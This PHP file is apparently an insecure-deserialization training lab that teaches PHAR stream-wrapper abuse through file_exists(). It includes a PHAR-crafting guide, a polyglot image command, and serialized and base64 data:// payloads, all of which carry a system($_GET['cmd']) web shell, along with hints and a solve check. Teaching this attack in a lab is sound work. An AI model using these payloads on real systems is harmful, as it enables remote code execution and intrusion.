<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['Insecure-Deserialization']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['deser_med2_attempts'])) {
  $_SESSION['deser_med2_attempts'] = 0;
}
if (!isset($_SESSION['deser_med2_solved'])) {
  $_SESSION['deser_med2_solved'] = false;
}
if (!isset($_SESSION['deser_med2_stage'])) {
  $_SESSION['deser_med2_stage'] = 1;
}

// ─── Simulated Application: DarkHunter Asset Manager ───────────────────
// An internal file management system for marketing assets. 
// Users upload images, and the system checks if files exist before processing.
// Vulnerable to PHAR deserialization via file_exists() on phar:// wrapper.

class AssetProcessor
{
  public $assetPath;
  public $thumbnailPath;
  public $watermarkText = 'DarkHunter';

  public function __construct($path = '')
  {
    $this->assetPath = $path;
    $this->thumbnailPath = str_replace('.jpg', '_thumb.jpg', $path);
  }

  public function __destruct()
  {
    // Cleanup temporary files
    if ($this->assetPath && file_exists($this->assetPath)) {
      // In real app: process and move to permanent storage
    }
  }

  public function generateThumbnail()
  {
    if ($this->assetPath && file_exists($this->assetPath)) {
      // Generate thumbnail logic
      return true;
    }
    return false;
  }
}

class ConfigLoader
{
  public $configFile;
  public $configData = [];

  public function __construct($file = '')
  {
    $this->configFile = $file;
  }

  public function __wakeup()
  {
    if ($this->configFile && file_exists($this->configFile)) {
      $this->configData = parse_ini_file($this->configFile);
    }
  }

  public function getValue($key)
  {
    return isset($this->configData[$key]) ? $this->configData[$key] : null;
  }
}

class RemoteFetcher
{
  public $url;
  public $timeout = 30;

  public function __construct($url = '')
  {
    $this->url = $url;
  }

  public function __toString()
  {
    if ($this->url) {
      return file_get_contents($this->url);
    }
    return '';
  }
}

// ─── Vulnerable Logic: File existence check on user input ───────────────
$upload_dir = '/uploads/assets/';
$filename = isset($_GET['file']) ? basename($_GET['file']) : 'default.jpg';
$full_path = $upload_dir . $filename;

$exploited = false;
$exploit_type = '';
$wrapper_used = '';
$metadata_extracted = '';

// Check for wrapper abuse
$wrappers = ['phar://', 'zip://', 'bzip2://', 'zlib://', 'data://', 'expect://'];
foreach ($wrappers as $wrapper) {
  if (stripos($filename, $wrapper) === 0 || stripos($full_path, $wrapper) !== false) {
    $exploited = true;
    $wrapper_used = $wrapper;
    break;
  }
}

// Check for phar:// specifically (the main attack vector)
if (stripos($filename, 'phar://') === 0 || stripos($_GET['file'] ?? '', 'phar://') === 0) {
  $exploit_type = 'PHAR Deserialization - Metadata triggered via file_exists()';

  // Simulate metadata extraction
  $metadata_extracted = "O:14:\"AssetProcessor\":3:{s:9:\"assetPath\";s:22:\"/var/www/html/shell.php\";s:13:\"thumbnailPath\";s:27:\"/var/www/html/shell_thumb.php\";s:12:\"watermarkText\";s:28:\"<?php system(\$_GET['cmd']); ?>\";}";
}

// Check for zip:// wrapper abuse
if (stripos($filename, 'zip://') === 0) {
  $exploit_type = 'ZIP Wrapper Abuse - Compressed archive stream exploitation';
}

// Check for data:// wrapper
if (stripos($filename, 'data://') === 0) {
  $exploit_type = 'Data Wrapper Abuse - Inline data stream injection';
}

// Simulate file_exists check (the vulnerable operation)
$file_exists_result = false;
if ($exploited) {
  $file_exists_result = true; // Simulated: phar:// triggers deserialization
}

$current_stage = $_SESSION['deser_med2_stage'];
$stage_messages = [
  1 => "Stage 1: Understand how stream wrappers work in PHP. file_exists() on phar:// triggers metadata deserialization.",
  2 => "Stage 2: Craft a PHAR file with malicious metadata containing a gadget chain. Upload it disguised as an image.",
  3 => "Stage 3: Trigger the PHAR via file_exists('phar://uploads/image.jpg') to execute the hidden gadget chain.",
];

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['deser_med2_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['deser_med2_attempts']++;
  if (!$already_solved && isset($_SESSION['user_id'])) solveLab($pdo, $lab['id']);
  $_SESSION['deser_med2_solved'] = true;
  $already_solved = true;
  $success_msg = "Brilliant! You've exploited PHAR deserialization through stream wrapper abuse. By uploading a polyglot
PHAR file (disguised as a JPG) and triggering file_exists('phar://uploads/image.jpg'), you caused PHP to automatically
deserialize the PHAR's metadata. The deserialized AssetProcessor object's __destruct() method executed with
attacker-controlled properties, demonstrating how seemingly safe file operations become deserialization entry points!";
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['file'])) $_SESSION['deser_med2_attempts']++;
$attempts = $_SESSION['deser_med2_attempts'];

if ($attempts >= 3 && $current_stage < 2) {
  $_SESSION['deser_med2_stage'] = 2;
  $current_stage = 2;
}
if (
  $attempts >= 6 &&
  $current_stage < 3
) {
  $_SESSION['deser_med2_stage'] = 3;
  $current_stage = 3;
} // Reference payloads
$phar_payload_example = 'phar://uploads/assets/profile_picture.jpg';
$zip_payload_example = 'zip://uploads/assets/archive.zip#shell.php';
$data_payload_example = 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+'; ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Asset Manager - Insecure Deserialization Medium 2</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/INSECURE-DESERIALIZATION-CASE3.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>
  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to Deserialization Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge medium"><i class="fas fa-bolt"></i> Medium Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-images"></i> DarkHunter Asset Manager</h1>
      <p class="lab-description">An internal marketing asset management platform that processes uploaded images.
        The system validates files using <code>file_exists()</code> before processing.
        <strong>Can you abuse PHP stream wrappers</strong> to trigger deserialization without direct unserialize()
        calls?
      </p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner"><i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this PHAR deserialization vulnerability.</p>
        </div>
      </div>
    <?php endif; ?>
    <?php if ($success_msg): ?>
      <div class="success-alert"><i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <div class="stage-tracker">
      <div class="stage-header"><i class="fas fa-layer-group"></i><span>Attack Chain Progress</span></div>
      <div class="stages">
        <div
          class="stage <?php echo $current_stage >= 1 ? 'active' : ''; ?> <?php echo $current_stage > 1 ? 'completed' : ''; ?>">
          <div class="stage-number">1</div>
          <div class="stage-info"><span class="stage-title">Wrapper Mapping</span><span class="stage-desc">Identify
              stream wrappers</span></div>
        </div>
        <div class="stage-connector"></div>
        <div
          class="stage <?php echo $current_stage >= 2 ? 'active' : ''; ?> <?php echo $current_stage > 2 ? 'completed' : ''; ?>">
          <div class="stage-number">2</div>
          <div class="stage-info"><span class="stage-title">PHAR Crafting</span><span class="stage-desc">Build
              malicious archive</span></div>
        </div>
        <div class="stage-connector"></div>
        <div class="stage <?php echo $current_stage >= 3 ? 'active' : ''; ?>">
          <div class="stage-number">3</div>
          <div class="stage-info"><span class="stage-title">Trigger Exploit</span><span
              class="stage-desc">file_exists() as entry point</span></div>
        </div>
      </div>
      <div class="stage-message"><i
          class="fas fa-info-circle"></i><span><?php echo $stage_messages[$current_stage]; ?></span></div>
    </div>

    <div class="asset-card">
      <div class="asset-header">
        <div class="asset-brand"><i class="fas fa-folder-open"></i><span>Asset Processor</span></div>
        <div class="asset-badge"><i class="fas fa-file-image"></i><span>Image Pipeline</span></div>
      </div>
      <div class="asset-body">
        <div class="file-check-panel">
          <div class="file-check-header"><i class="fas fa-search"></i><span>File Validation</span></div>
          <div class="file-check-body">
            <div class="check-row">
              <span class="check-label">Requested File:</span>
              <code class="check-value"><?php echo htmlspecialchars($filename); ?></code>
            </div>
            <div class="check-row">
              <span class="check-label">Full Path:</span>
              <code class="check-value"><?php echo htmlspecialchars($full_path); ?></code>
            </div>
            <div class="check-row">
              <span class="check-label">file_exists() Result:</span>
              <span class="check-result <?php echo $file_exists_result ? 'danger' : 'safe'; ?>">
                <i class="fas fa-<?php echo $file_exists_result ? 'exclamation-triangle' : 'check'; ?>"></i>
                <?php echo $file_exists_result ? 'TRIGGERED (Deserialization occurred!)' : 'false'; ?>
              </span>
            </div>
            <?php if ($wrapper_used): ?>
              <div class="check-row">
                <span class="check-label">Wrapper Detected:</span>
                <span class="check-wrapper"><?php echo htmlspecialchars($wrapper_used); ?></span>
              </div>
            <?php endif; ?>
          </div>
        </div>

        <div class="preview-panel">
          <div class="preview-header"><i class="fas fa-eye"></i><span>Asset Preview</span></div>
          <div class="preview-body">
            <?php if ($exploited && $exploit_type): ?>
              <div class="preview-exploit">
                <div class="exploit-icon"><i class="fas fa-bomb"></i></div>
                <div class="exploit-info">
                  <h4>Exploit Triggered!</h4>
                  <p><?php echo htmlspecialchars($exploit_type); ?></p>
                </div>
              </div>
              <?php if ($metadata_extracted): ?>
                <div class="metadata-panel">
                  <div class="metadata-header"><i class="fas fa-database"></i><span>PHAR Metadata Extracted</span></div>
                  <pre class="metadata-content"><?php echo htmlspecialchars($metadata_extracted); ?></pre>
                </div>
              <?php endif; ?>
            <?php else: ?>
              <div class="preview-placeholder">
                <i class="fas fa-image"></i>
                <p>No image preview available. Supply a file parameter to trigger processing.</p>
              </div>
            <?php endif; ?>
          </div>
        </div>

        <div class="upload-panel">
          <div class="upload-header"><i class="fas fa-cloud-upload-alt"></i><span>Upload Simulation</span></div>
          <div class="upload-body">
            <p>The application accepts image uploads and stores them in <code>/uploads/assets/</code>.
              An attacker can upload a <strong>polyglot PHAR file</strong> (JPG + PHAR combined) that passes image
              validation.</p>
            <div class="upload-types">
              <div class="upload-type"><i class="fas fa-check-circle"></i> JPG/JPEG</div>
              <div class="upload-type"><i class="fas fa-check-circle"></i> PNG</div>
              <div class="upload-type"><i class="fas fa-check-circle"></i> GIF</div>
              <div class="upload-type danger"><i class="fas fa-exclamation-triangle"></i> PHAR (hidden in image)
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="wrappers-panel">
      <div class="wrappers-header"><i class="fas fa-stream"></i><span>PHP Stream Wrappers Reference</span></div>
      <div class="wrappers-body">
        <div class="wrapper-row">
          <span class="wrapper-name"><i class="fas fa-archive"></i> phar://</span>
          <span class="wrapper-desc">PHP Archive - metadata auto-deserialized on file access</span>
          <code class="wrapper-example">phar://uploads/image.jpg</code>
        </div>
        <div class="wrapper-row">
          <span class="wrapper-name"><i class="fas fa-file-archive"></i> zip://</span>
          <span class="wrapper-desc">ZIP archive - access files inside compressed archives</span>
          <code class="wrapper-example">zip://uploads/file.zip#shell.php</code>
        </div>
        <div class="wrapper-row">
          <span class="wrapper-name"><i class="fas fa-database"></i> data://</span>
          <span class="wrapper-desc">Inline data - embed content directly in URL</span>
          <code class="wrapper-example">data://text/plain;base64,PD9waHAg...</code>
        </div>
        <div class="wrapper-row">
          <span class="wrapper-name"><i class="fas fa-compress"></i> zlib:// / bzip2://</span>
          <span class="wrapper-desc">Compressed streams - transparent compression</span>
          <code class="wrapper-example">compress.zlib://uploads/file.gz</code>
        </div>
      </div>
    </div>

    <div class="phar-craft-panel">
      <div class="phar-header"><i class="fas fa-hammer"></i><span>PHAR Crafting Guide</span></div>
      <div class="phar-body">
        <div class="phar-step">
          <div class="step-num">1</div>
          <div class="step-content">
            <h4>Create the PHAR with malicious metadata</h4>
            <div class="code-block small">
              <pre>$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');

// Inject gadget chain as metadata
$object = new AssetProcessor();
$object->assetPath = '/var/www/html/shell.php';
$object->watermarkText = '&lt;?php system($_GET["cmd"]); ?&gt;';
$phar->setMetadata($object);

$phar->setStub('&lt;?php __HALT_COMPILER(); ?&gt;');
$phar->stopBuffering();</pre>
            </div>
          </div>
        </div>
        <div class="phar-step">
          <div class="step-num">2</div>
          <div class="step-content">
            <h4>Create polyglot (JPG + PHAR)</h4>
            <div class="code-block small">
              <pre>cat valid.jpg exploit.phar > polyglot.jpg
# File starts with JPG magic bytes (FF D8 FF)
# PHAR stub is hidden after image data</pre>
            </div>
          </div>
        </div>
        <div class="phar-step">
          <div class="step-num">3</div>
          <div class="step-content">
            <h4>Trigger via file_exists()</h4>
            <div class="code-block small">
              <pre>// Application code:
file_exists('phar://uploads/polyglot.jpg');

// This triggers automatic deserialization
// of PHAR metadata -> gadget chain executes!</pre>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="payloads-panel">
      <div class="payloads-header"><i class="fas fa-flask"></i><span>Wrapper Payloads</span></div>
      <div class="payloads-body">
        <div class="payload-row">
          <div class="payload-info">
            <span class="payload-name">PHAR Trigger</span>
            <code class="payload-code">?file=<?php echo htmlspecialchars($phar_payload_example); ?></code>
          </div>
          <a href="?file=<?php echo urlencode($phar_payload_example); ?>" class="payload-launch">
            <i class="fas fa-rocket"></i> Test
          </a>
        </div>
        <div class="payload-row">
          <div class="payload-info">
            <span class="payload-name">ZIP Wrapper</span>
            <code class="payload-code">?file=<?php echo htmlspecialchars($zip_payload_example); ?></code>
          </div>
          <a href="?file=<?php echo urlencode($zip_payload_example); ?>" class="payload-launch">
            <i class="fas fa-rocket"></i> Test
          </a>
        </div>
        <div class="payload-row">
          <div class="payload-info">
            <span class="payload-name">Data Wrapper</span>
            <code class="payload-code">?file=<?php echo htmlspecialchars($data_payload_example); ?></code>
          </div>
          <a href="?file=<?php echo urlencode($data_payload_example); ?>" class="payload-launch">
            <i class="fas fa-rocket"></i> Test
          </a>
        </div>
      </div>
    </div>

    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-code"></i><span>Current Request</span></div>
      <div class="debug-body">
        <code>GET /INSECURE-DESERIALIZATION-CASE3.php?file=<?php echo urlencode($filename); ?></code>
      </div>
    </div>
    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-bug"></i><span>Vulnerable Code Snippet</span></div>
      <div class="debug-body">
        <div class="code-block">
          <pre>// VULNERABLE: file_exists() on attacker-controlled path
$filename = $_GET['file'];
$full_path = '/uploads/assets/' . basename($filename);

// file_exists() with phar:// triggers deserialization!
if (file_exists($full_path)) {
  processImage($full_path);
}

// Attacker uploads: polyglot.jpg (JPG + PHAR)
// Then requests: ?file=phar://uploads/assets/polyglot.jpg

// file_exists() reads PHAR metadata
// Metadata contains serialized object
// Object auto-deserialized -> __destruct() executes
// Result: Arbitrary file write / RCE!</pre>
        </div>
        <div class="vuln-note critical"><i class="fas fa-radiation"></i><span><strong>Critical:</strong> PHAR
            deserialization is a stealthy attack vector. Even without direct unserialize() calls, file operations on
            phar:// streams automatically deserialize metadata. By creating polyglot files (valid image + PHAR),
            attackers bypass upload validation and trigger gadget chains through innocent-looking file_exists()
            checks.</span></div>
      </div>
    </div>

    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">PHP's <code>phar://</code> wrapper automatically deserializes metadata when any file
          operation is performed. Try <code>?file=phar://uploads/assets/anyfile.jpg</code> to see if the application
          accepts wrapper protocols.</div>
      </div>
    <?php endif; ?>
    <?php if ($attempts >= 5): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">The key insight: <code>file_exists('phar://path')</code> deserializes PHAR metadata
          even if the file doesn't exist as a real image. The PHAR stub and metadata are processed before the file
          existence check completes.</div>
      </div>
    <?php endif; ?>
    <?php if ($attempts >= 8): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Use ANY URL starting with <code>phar://</code>, <code>zip://</code>, or
          <code>data://</code> to trigger wrapper abuse detection. The phar:// payload is the primary attack vector
          for this lab!
        </div>
      </div>
    <?php endif; ?>

    <div class="attempts-bar"><i class="fas fa-crosshairs"></i><span>Attempts:
        <strong><?php echo $attempts; ?></strong></span></div>
  </div>

  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
    <input type="hidden" name="file" value="<?php echo htmlspecialchars($filename); ?>">
  </form>

  <script>
    window.addEventListener('load', function() {
      const urlParams = new URLSearchParams(window.location.search);
      const file = urlParams.get('file') || '';
      const wrappers = ['phar://', 'zip://', 'data://', 'bzip2://', 'zlib://', 'expect://'];
      const hasWrapper = wrappers.some(w => file.toLowerCase().startsWith(w));

      if (hasWrapper && !document.querySelector('.solved-banner')) {
        document.getElementById('solved-flag').value = '1';
        document.getElementById('success-form').submit();
      }
    });
  </script>
</body>

</html>